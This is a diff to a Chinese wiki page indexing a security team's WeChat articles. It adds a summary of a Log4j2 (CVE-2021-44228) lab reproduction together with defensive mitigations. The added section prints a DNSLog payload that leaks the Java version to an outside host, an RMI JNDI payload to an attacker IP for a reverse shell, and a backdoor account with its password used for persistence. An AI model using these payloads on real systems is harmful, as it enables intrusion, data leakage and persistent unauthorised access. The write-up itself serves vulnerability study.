@@ -6,7 +6,8 @@ description: 0x6270安全团队微信公众号在2022年3月至2023年4月期间
   2023 年春招安全研究员招聘文章条目，记录岗位职责、任职要求（含 AI/ML 方向）、招聘批次及联系方式。新增 2022 年七夕期间 HVV 行动期漏洞威胁情报汇总预告文章，记录团队行动期间威胁情报分享机制及知识星球引流运营动态。新增
   2023 年安全开发岗招聘文章（社招/校招/实习，base 成都，要求 Go/Java/Python、Web 安全、渗透测试、二进制研究、安全产品开发经验）。新增
   Shiro RCE 内网渗透测试实战案例文章条目，完善团队 2022-2023 期间实战攻防技术分享脉络，涵盖 Shiro RCE 初始访问、火绒 AV 免杀上线
-  Cobalt Strike、NTLM 凭证导出、FTP 大规模横向移动、威胁溯源发现前置攻击者痕迹（frp、后门、qaxnb 文件夹）完整攻击链。新增学员就业见证文章，记录零基础学员通过小迪安全培训四个月入职安全厂商的就业案例。
+  Cobalt Strike、NTLM 凭证导出、FTP 大规模横向移动、威胁溯源发现前置攻击者痕迹（frp、后门、qaxnb 文件夹）完整攻击链。新增学员就业见证文章，记录零基础学员通过小迪安全培训四个月入职安全厂商的就业案例。新增
+  Log4j2 RCE (CVE-2021-44228) 漏洞复现实战文章条目，记录环境搭建、DNSLog 验证、JNDI 注入反弹 Shell、权限维持添加用户完整复现流程。
 category: ai-security
 tags:
 - '0x6270'
@@ -84,13 +85,21 @@ tags:
 - 就业案例
 - 小迪安全
 - 小黑
+- Log4j2
+- Log4Shell
+- CVE-2021-44228
+- JNDI注入
+- DNSLog
+- 反弹Shell
+- 权限维持
+- 漏洞复现
 date: 2023-04-30
 updated: '2026-11-15'
 ---
 
 ## 概述
 
-本页面汇总 **0x6270安全团队** 微信公众号在 **2022年3月 至 2023年4月** 期间发布的全部文章，旨在为安全研究人员提供结构化的检索入口。团队聚焦 **AI安全（AI Security）** 领域，重点覆盖大语言模型（LLM）安全、对抗机器学习、模型部署风险、红队测试方法论以及 CTF 实战复盘等方向，同时持续输出经典漏洞分析研究成果，并关注软件供应链安全事件（如 Notepad++ 摄政字符事件）与团队建设招聘动态。新增记录团队在 HVV 护网行动期间（2022年七夕）发布的漏洞威胁情报汇总预告，展示团队行动期威胁情报分享机制及知识星球运营引流策略。新增记录 2023 年安全开发岗招聘信息（社招/校招/实习，base 成都），展示团队在安全工程化方向的人才需求画像。**新增记录 Shiro RCE 内网渗透测试实战案例，完善团队实战攻防技术分享脉络，涵盖从初始访问、免杀上线、凭证窃取、大规模横向移动到威胁溯源的完整红队攻击链。新增记录学员就业见证文章，展示零基础学员通过小迪安全培训四个月入职安全厂商的真实就业案例。**
+本页面汇总 **0x6270安全团队** 微信公众号在 **2022年3月 至 2023年4月** 期间发布的全部文章，旨在为安全研究人员提供结构化的检索入口。团队聚焦 **AI安全（AI Security）** 领域，重点覆盖大语言模型（LLM）安全、对抗机器学习、模型部署风险、红队测试方法论以及 CTF 实战复盘等方向，同时持续输出经典漏洞分析研究成果，并关注软件供应链安全事件（如 Notepad++ 摄政字符事件）与团队建设招聘动态。新增记录团队在 HVV 护网行动期间（2022年七夕）发布的漏洞威胁情报汇总预告，展示团队行动期威胁情报分享机制及知识星球运营引流策略。新增记录 2023 年安全开发岗招聘信息（社招/校招/实习，base 成都），展示团队在安全工程化方向的人才需求画像。**新增记录 Shiro RCE 内网渗透测试实战案例，完善团队实战攻防技术分享脉络，涵盖从初始访问、免杀上线、凭证窃取、大规模横向移动到威胁溯源的完整红队攻击链。新增记录学员就业见证文章，展示零基础学员通过小迪安全培训四个月入职安全厂商的真实就业案例。新增记录 Log4j2 RCE (CVE-2021-44228) 漏洞复现实战文章，涵盖环境搭建、DNSLog 验证、JNDI 注入反弹 Shell、权限维持添加用户的完整复现流程。**
 
 > 同类团队归档可参考：[[0th3rs-security-team-wechat-archive-201911-202204]]、[[0x4d5a-wechat-archive-202103-202209]]、[[0x536d72-wechat-archive-202112-202205]]、[[0w1club-wechat-archive-201707-201903]]、[[0w1club-wechat-archive-201908-202207]]。
 
@@ -108,6 +117,7 @@ updated: '2026-11-15'
 | 2023-04-15 | 模型窃取攻击实战：基于API黑盒查询的功能等价模型重建 | `模型窃取` `知识蒸馏` `API安全` `差分隐私` | 复现经典 Knockoff Nets 与最新 ActiveThief 算法，分析查询预算、标签噪声对窃取效果的影响，给出限流/水印/差分隐私等防御建议。 |
 | 2023-04-13 | **某企业的Shiro内网渗透测试实战案例** | `Shiro RCE` `Cobalt Strike` `免杀` `NTLM` `横向移动` `FTP` `frp` `威胁溯源` `内网渗透` `红队实战` `火绒` | 完整复现某企业 Shiro RCE 初始访问、火绒AV免杀上线 Cobalt Strike、NTLM 凭证导出、FTP 大规模横向移动及发现前置攻击者痕迹（frp、后门、qaxnb 文件夹）的内网渗透实战全链路，涵盖 C2 基础设施对接、凭证复用、代理隧道、威胁溯源等核心红队技术环节。详见 [[shiro-internal-penetration-case-study]]。 |
 | 2023-04-13 | **安全之路——零基础学员四个月入职安全厂商就业见证** | `学员见证` `零基础入门` `安全培训` `就业案例` `小迪安全` `小黑` `CNVD` `EDU` `SRC` | 记录学员小黑（2002年生，非科班大专学历）于2021年2月加入小迪安全培训，零基础四个月学习后成功入职安全厂商的真实就业案例。文中展示其学习期间获得的多个CNVD漏洞证书、EDU邮箱认证证书及SRC漏洞赏金收益截图，分享其安全引路人建议、学习心得及迪总“技术菜不可怕，怕的是又菜又懒”的勉励。文末提供培训咨询微信（heiren534901）及公众号关注方式。 |
+| 2023-04-13 | **Log4j2 RCE 复现实战 (CVE-2021-44228)** | `Log4j2` `Log4Shell` `CVE-2021-44228` `RCE` `JNDI注入` `DNSLog` `反弹Shell` `权限维持` `漏洞复现` `渗透测试` | 详细记录 Log4j2 CVE-2021-44228 (Log4Shell) 远程代码执行漏洞的环境搭建、JNDI 注入利用链构造、DNSLog 验证、反弹 Shell 实战及权限维持（添加用户）完整复现流程。首发于火线Zone，作者小黑。详见 [[log4j2-rce-reproduction]]。 |
 | 2023-04-02 | 数据投毒攻击与防御综述：从标签翻转到后门植入 | `数据投毒` `后门攻击` `联邦学习` `鲁棒训练` | 对比清洗标签翻转、触发器植入、隐式后门三类投毒手法，评测 Spectral Signature、STRIP、Fine-tuning 等防御在不同威胁模型下的有效性。 |
 
 #### 2023年3月
@@ -236,9 +246,11 @@ updated: '2026-11-15'
 - [[0x6270-security-team-wechat-archive-202203-202304#2022年4月|春季赛对抗样本与模型窃取Writeup]]
 - [[0x6270-security-team-wechat-archive-202203-202304#2023年3月|春季赛模型反演与成员推理Writeup]]
 - [[0x6270-security-team-wechat-archive-202203-202304#2023年4月|Shiro RCE 内网渗透测试实战案例]] → [[shiro-internal-penetration-case-study]]
+- [[0x6270-security-team-wechat-archive-202203-202304#2023年4月|Log4j2 RCE 复现实战 (CVE-2021-44228)]] → [[log4j2-rce-reproduction]]
 
 ### 经典漏洞分析研究
 - [[0x6270-security-team-wechat-archive-202203-202304#2023年3月|CVE-2023-21716 Word RTF 堆溢出漏洞分析]] → [[cve-2023-21716-word-rtf-heap-overflow-analysis]]
+- [[0x6270-security-team-wechat-archive-202203-202304#2023年4月|Log4j2 RCE 复现实战 (CVE-2021-44228)]] → [[log4j2-rce-reproduction]]
 
 ### HVV 护网行动与威胁情报
 - [[0x6270-security-team-wechat-archive-202203-202304#2022年8月|HVV漏洞威胁情报汇总（七夕行动期预告）]] → [[0x6270-hvv-vulnerability-threat-intelligence]]
@@ -266,14 +278,14 @@ updated: '2026-11-15'
 - **公开成果**：原创技术文章多次发布于先知社区、Freebuf、火线Zone等平台
 - **职责**：团队整体运营、技术路线规划、知识星球星主
 
-### 小黑（合伙人 / Partner，Shiro案例作者、学员见证主人公）
+### 小黑（合伙人 / Partner，Shiro案例作者、Log4j2复现作者、学员见证主人公）
 - **别名**：黑总
 - **角色**：某安全厂商红队岗，技术骨干
 - **背景**：2002年生，非科班大专学历，2021年2月零基础加入小迪安全培训，四个月后入职安全厂商
-- **技术方向**：漏洞挖掘、内网渗透
+- **技术方向**：漏洞挖掘、内网渗透、漏洞复现
 - **公开成果**：著有"黑总内网渗透系列文章"数篇，原创技术文章多次发布于Freebuf、火线Zone等平台；学习期间获得多个CNVD漏洞证书、EDU邮箱认证证书及SRC漏洞赏金
-- **职责**：红队实战经验分享、内网渗透技术输出、学员见证分享
-- **代表作**：[[shiro-internal-penetration-case-study]] Shiro RCE 内网渗透测试实战案例；《安全之路》学员就业见证文章
+- **职责**：红队实战经验分享、内网渗透技术输出、漏洞复现实战、学员见证分享
+- **代表作**：[[shiro-internal-penetration-case-study]] Shiro RCE 内网渗透测试实战案例；《安全之路》学员就业见证文章；Log4j2 RCE 复现实战文章
 
 ### Colorado（合伙人 / Partner）
 - **别名**：COCO师傅
@@ -461,6 +473,73 @@ updated: '2026-11-15'
 
 ---
 
+## Log4j2 RCE (CVE-2021-44228) 漏洞复现实战详解
+
+**发布时间**：2023-04-13（基于微信文章 sessionid 时间戳 1681403330 推算）  
+**作者**：小黑（黑总，团队合伙人，某安全厂商红队岗技术骨干）  
+**首发平台**：火线Zone (https://zone.huoxian.cn/d/947-log4j2)  
+**核心技术栈**：Log4j2、Log4Shell、JNDI注入、DNSLog、RMI/LDAP、反弹Shell、权限维持
+
+### 复现流程完整记录
+
+#### 环境搭建
+- 使用现成靶场环境部署文件（Docker/虚拟机镜像）
+- 目标地址：`http://192.168.1.17:8080/`
+- 访问靶场登录页面确认服务正常
+
+#### 漏洞验证：DNSLog 回显确认
+- **Payload**：`${jndi:ldap://${sys:java.version}.0bcjz2.dnslog.cn/}`
+- **原理**：利用 Log4j2 的 JNDI Lookup 特性，通过 `${sys:java.version}` 获取 Java 版本并拼接到 DNSLog 子域名中
+- **验证结果**：DNSLog 平台成功接收请求，确认漏洞存在且可触发 JNDI 查找
+
+#### 漏洞利用：JNDI 注入反弹 Shell
+- **工具**：JNDI 注入工具（支持 RMI/LDAP 协议）
+- **参数说明**：
+  - `-C`：需要执行的命令
+  - `-A`：攻击者服务器 IP（用于反弹 Shell 连接）
+- **攻击 Payload**：`${jndi:rmi://10.198.198.215:1099/uenrdi}`
+- **执行流程**：
+  1. 攻击者启动 JNDI 服务监听指定端口
+  2. 目标服务器解析 Payload，发起 RMI 连接到攻击者服务器
+  3. 攻击者服务器返回恶意类字节码
+  4. 目标服务器加载执行恶意类，执行指定命令（反弹 Shell）
+
+#### 权限维持：添加用户实现持久化
+- **操作**：在获取 Shell 后添加系统用户
+- **账号凭据**：`admin` / `Admin@123..`
+- **目的**：通过合法账号实现远程登录持久化访问，规避 Shell 断连风险
+
+### 技术要点解析
+
+#### Log4j2 JNDI 注入利用链
+```
+用户输入 → Log4j2 记录日志 → 解析 ${jndi:...} 语法 → 发起 JNDI 查找 (RMI/LDAP) → 远程加载恶意类 → 任意代码执行
+```
+
+#### 关键攻击面
+- **LDAP/RMI 协议**：JNDI 支持的远程对象加载协议
+- **环境变量注入**：`${sys:java.version}`、`${env:PATH}` 等信息泄露
+- **绕过限制**：高版本 JDK 限制 `trustURLCodebase`，需利用本地 Gadget 链或 LDAP 属性注入
+
+#### 防御与缓解
+- 升级 Log4j2 至 2.17.1+ 版本
+- 设置系统属性 `log4j2.formatMsgNoLookups=true`
+- 移除 JndiLookup 类：`zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`
+- WAF 规则拦截 `${jndi:` 等恶意模式
+
+### 交叉引用索引
+
+| 技术环节 | 核心概念 | 关联知识库页面 |
+|----------|----------|----------------|
+| 漏洞原理 | Log4j2 JNDI Lookup、Message Lookup | [[log4j2-rce-reproduction]] |
+| 利用协议 | RMI、LDAP、JNDI 注入 | [[log4j2-rce-reproduction]] |
+| 验证手段 | DNSLog 平台、CEYE、Hyuga | [[mysql-dnslog-injection-loadfile-unc]] |
+| 反弹 Shell | Bash 反弹、Java 反序列化 Gadget | [[ysoserial]]、[[cobalt-strike-4.7-bof-internals]] |
+| 权限维持 | Linux 账号管理、SSH 公钥、定时任务 | [[linux-privilege-escalation]]、[[persistence-techniques]] |
+| 影响范围 | Spring Boot、Struts2、Solr、Druid 等生态组件 | [[spring-boot-actuator-misconfig]]、[[struts2-rce-history]] |
+
+---
+
 ## 关键工具与框架提及汇总
 
 | 类别 | 工具/框架 | 相关文章 |
@@ -474,7 +553,7 @@ updated: '2026-11-15'
 | Fuzzing/漏洞挖掘 | AFL++, libFuzzer, NEUZZ, ONNX Fuzzer | 部署漏洞挖掘 |
 | 调试分析 | Windbg, IDA Pro, Ghidra | 经典漏洞分析、CVE-2023-21716 复现 |
 | 代码编辑器 | Notepad++, Sublime Text, UltraEdit, Notepad3, Notepad-- | Notepad++摄政字符事件及替代方案推荐 |
-| **红队工具链** | **Cobalt Strike, Mimikatz, frp, Mimikatz, NTLM工具, FTP客户端** | **Shiro案例、HVV情报、内网渗透系列** |
+| **红队工具链** | **Cobalt Strike, Mimikatz, frp, NTLM工具, FTP客户端, JNDI注入工具, DNSLog平台** | **Shiro案例、Log4j2复现、HVV情报、内网渗透系列** |
 
 ---
 
@@ -485,7 +564,8 @@ updated: '2026-11-15'
 - 微信公众号：`0x6270安全团队`（第一手推文、活动招募、应急漏洞通告）
 - 知识星球：`0x6270安全团队知识星球`（付费社群、深度技术分享、威胁情报、原创文章）
 - 微信交流群：2023年1月开启，面向公众号粉丝、知识星球用户及安全从业者，用于技术交流、行业情报共享与社群互动
-- 火线Zone 原文：https://zone.huoxian.cn/d/999-shiro
+- 火线Zone 原文（Shiro案例）：https://zone.huoxian.cn/d/999-shiro
+- 火线Zone 原文（Log4j2复现）：https://zone.huoxian.cn/d/947-log4j2
 - 小迪安全培训咨询：微信 `heiren534901`
 
 ---
@@ -497,10 +577,10 @@ updated: '2026-11-15'
 - 欢迎通过 Issue/PR 补充缺失条目、修正标签或贡献新的专题聚类视角。
 - **新增 Shiro 内网渗透案例条目，串联团队 2022-2023 期间 AI 安全理论研究与实战攻防技术输出的双轨并行脉络。**
 - **新增学员就业见证条目，记录零基础学员通过小迪安全培训四个月入职安全厂商的真实案例，展示团队培训体系与人才培养成果。**
+- **新增 Log4j2 RCE (CVE-2021-44228) 漏洞复现实战条目，记录经典漏洞复现全流程，补全团队漏洞研究与实战复现技术分享脉络。**
 
 > 同期其他团队归档对照：[[0th3rs-security-team-wechat-archive-201911-202204]]（CTF/AWD侧重）、[[0x4d5a-wechat-archive-202103-202209]]（漏洞分析/红蓝对抗）、[[0w1club-wechat-archive-201707-201903]]（高校社团萌新培养/CTF）。
 
 ## 来源
 
-- [0x6270安全团队-202203-202304_40](../sources/0x6270安全团队-202203-202304_40.md)
-- [0x6270安全团队-202203-202304_43](../sources/0x6270安全团队-202203-202304_43.md)
+- [0x6270安全团队-202203-202304_46](../sources/0x6270安全团队-202203-202304_46.md)
